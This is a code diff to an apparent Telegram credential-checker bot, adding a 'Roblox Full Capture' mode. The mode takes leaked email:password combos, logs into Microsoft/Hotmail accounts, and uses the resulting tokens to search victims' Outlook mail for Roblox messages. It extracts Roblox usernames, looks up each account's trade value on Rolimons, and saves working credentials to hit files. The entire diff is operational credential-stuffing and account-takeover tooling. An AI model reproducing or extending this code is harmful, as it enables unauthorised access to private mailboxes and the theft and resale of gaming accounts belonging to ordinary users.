@@ -276,6 +276,58 @@ def extract_tiktok_username(search_text):
                 return potential_username
     return None
 
+# --- Roblox Full Capture Logic ---
+def extract_roblox_username(search_text):
+    # Roblox email patterns
+    patterns = [
+        r'Hi ([a-zA-Z0-9_\.]{3,20}),',
+        r'Hello ([a-zA-Z0-9_\.]{3,20}),',
+        r'Your Roblox username is: ([a-zA-Z0-9_\.]{3,20})',
+        r'username: ([a-zA-Z0-9_\.]{3,20})',
+    ]
+    for pattern in patterns:
+        match = re.search(pattern, search_text)
+        if match:
+            return match.group(1)
+    return None
+
+def get_roblox_id(username):
+    try:
+        url = f"https://users.roblox.com/v1/users/search?keyword={username}&limit=10"
+        r = requests.get(url, timeout=10)
+        if r.status_code == 200:
+            data = r.json()
+            if data.get("data"):
+                for user in data["data"]:
+                    if user["name"].lower() == username.lower():
+                        return user["id"]
+    except: pass
+    return None
+
+def get_rolimons_data(user_id):
+    try:
+        # Rolimons profile page contains the stats in the HTML
+        url = f"https://www.rolimons.com/player/{user_id}"
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+        r = requests.get(url, headers=headers, timeout=10)
+        if r.status_code == 200:
+            html = r.text
+            # Use regex to find RAP and Value
+            rap_match = re.search(r'RAP: ([\d,]+)', html)
+            value_match = re.search(r'Value: ([\d,]+)', html)
+            
+            # Alternative: check for specific data-value attributes if the above fails
+            if not rap_match:
+                rap_match = re.search(r'data-rap="(\d+)"', html)
+            if not value_match:
+                value_match = re.search(r'data-value="(\d+)"', html)
+                
+            rap = rap_match.group(1).replace(',', '') if rap_match else "0"
+            value = value_match.group(1).replace(',', '') if value_match else "0"
+            return value, rap
+    except: pass
+    return "0", "0"
+
 # --- Checker Logic ---
 def get_capture(email, password, access_token, cid, selected_service=None, session_id=None):
     global service_hits
@@ -414,6 +466,68 @@ def check_imap(email, password, session_id):
             return "BAD"
         return "RETRY"
 
+def check_roblox_full(email, password, session_id):
+    global hit, bad, retry, service_hits
+    try:
+        # Step 1: Microsoft Login
+        ms_res = check_account_internal(email, password)
+        if ms_res["status"] != "HIT":
+            return ms_res["status"]
+        
+        token = ms_res["token"]
+        cid = ms_res["cid"]
+        
+        # Step 2: Search Roblox Emails to get username
+        search_url = "https://outlook.live.com/search/api/v2/query"
+        headers = {"Authorization": f"Bearer {token}", "X-AnchorMailbox": f"CID:{cid}", "Content-Type": "application/json"}
+        payload = {
+            "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off",
+            "EntityRequests": [{
+                "EntityType": "Conversation", "ContentSources": ["Exchange"],
+                "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
+                "From": 0, "Query": {"QueryString": "from:roblox.com OR roblox"}, "Size": 5, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
+            }]
+        }
+        r = requests.post(search_url, json=payload, headers=headers, timeout=10)
+        
+        roblox_username = None
+        if r.status_code == 200:
+            roblox_username = extract_roblox_username(r.text)
+        
+        if roblox_username:
+            # Step 3: Get Roblox ID and Rolimons data
+            user_id = get_roblox_id(roblox_username)
+            value, rap = "0", "0"
+            if user_id:
+                value, rap = get_rolimons_data(user_id)
+            
+            result_line = f"{email}:{password} | {roblox_username} | {value} | {rap}"
+            
+            output_path = os.path.join(HITS_DIR, session_id, "Roblox_Full_Capture.txt")
+            os.makedirs(os.path.dirname(output_path), exist_ok=True)
+            with lock:
+                with open(output_path, 'a', encoding='utf-8') as f:
+                    f.write(result_line + "\n")
+                service_hits["Roblox"] = service_hits.get("Roblox", 0) + 1
+            
+            # Save to general hits
+            all_hits_path = os.path.join(HITS_DIR, session_id, "Hits_All.txt")
+            with lock:
+                with open(all_hits_path, 'a', encoding='utf-8') as f:
+                    f.write(f"{email}:{password}\n")
+            return "HIT"
+        else:
+            # Hotmail HIT but no Roblox found
+            all_hits_path = os.path.join(HITS_DIR, session_id, "Hits_All.txt")
+            with lock:
+                with open(all_hits_path, 'a', encoding='utf-8') as f:
+                    f.write(f"{email}:{password}\n")
+            return "HIT"
+            
+    except Exception as e:
+        print(f"Roblox check error for {email}: {e}")
+        return "RETRY"
+
 def check_tiktok_full(email, password, session_id):
     global hit, bad, retry, service_hits
     try:
@@ -534,6 +648,8 @@ def check_account(email, password, selected_service=None, session_id=None):
     # Determine check mode
     if selected_service == "TIKTOK_CAPTURE":
         return check_tiktok_full(email, password, session_id)
+    if selected_service == "ROBLOX_CAPTURE":
+        return check_roblox_full(email, password, session_id)
     if selected_service == "IMAP_CHECKER":
         return check_imap(email, password, session_id)
     
@@ -633,6 +749,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("Check All Hotmail Services", callback_data="mode_all")],
         [InlineKeyboardButton("Hotmail Specific Service", callback_data="mode_select")],
         [InlineKeyboardButton("TikTok Full Capture Checker", callback_data="mode_tiktok")],
+        [InlineKeyboardButton("Roblox Full Capture Checker", callback_data="mode_roblox")],
         [InlineKeyboardButton("Mixed Mail IMAP Checker", callback_data="mode_imap")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
@@ -671,6 +788,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "mode_tiktok":
         context.user_data["mode"] = "TIKTOK_CAPTURE"
         await query.edit_message_text("Mode set to: **TikTok Full Capture Checker**\nPlease upload your `combos.txt` file.", parse_mode="Markdown")
+    elif data == "mode_roblox":
+        context.user_data["mode"] = "ROBLOX_CAPTURE"
+        await query.edit_message_text("Mode set to: **Roblox Full Capture Checker**\nPlease upload your `combos.txt` file.", parse_mode="Markdown")
     elif data == "mode_select":
         # Show category selection
         keyboard = []
